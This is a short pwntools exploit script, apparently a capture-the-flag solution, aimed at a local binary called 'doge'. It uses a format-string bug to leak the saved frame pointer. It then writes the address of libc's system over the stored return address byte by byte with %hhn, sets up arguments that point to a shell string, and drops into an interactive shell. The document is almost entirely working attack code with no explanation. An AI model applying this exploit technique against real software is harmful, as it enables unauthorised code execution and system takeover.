from pwn import *

# TODO change these according to libc
exit = 0xf7e01ac1
system = 0xf7e0e290
shell = 0xf7f4d6dc

r = process('doge')

# initial
r.recvlines(22)
r.sendline(p32(exit)+p32(shell))

r.recvline()
r.sendline('5')

r.recvline()

# leak the saved_ebp
saved_ebp_loc = 5+0x114/4 # buffer starts at arg@5 of printf; and is at $ebp+0x114
r.sendline('%{0}$X'.format(saved_ebp_loc))

r.recvline()
line = r.recvline()
saved_ebp = int('0x'+line.split(':')[1].strip(), 16)
stored_eip = saved_ebp-0x34+0x4
print 'stored_eip: ', hex(stored_eip)

for i, c in enumerate(p32(system)):
    addr = string.swapcase(p32(stored_eip+i))

    buf = addr
    buf += '%{0:03}x'.format(ord(c)-4)
    buf += '%5$HHN' # buffer starts at arg@5 of printf
    log.warn("Sending " + buf)

    r.sendline(buf)
    r.recvline()

r.interactive()
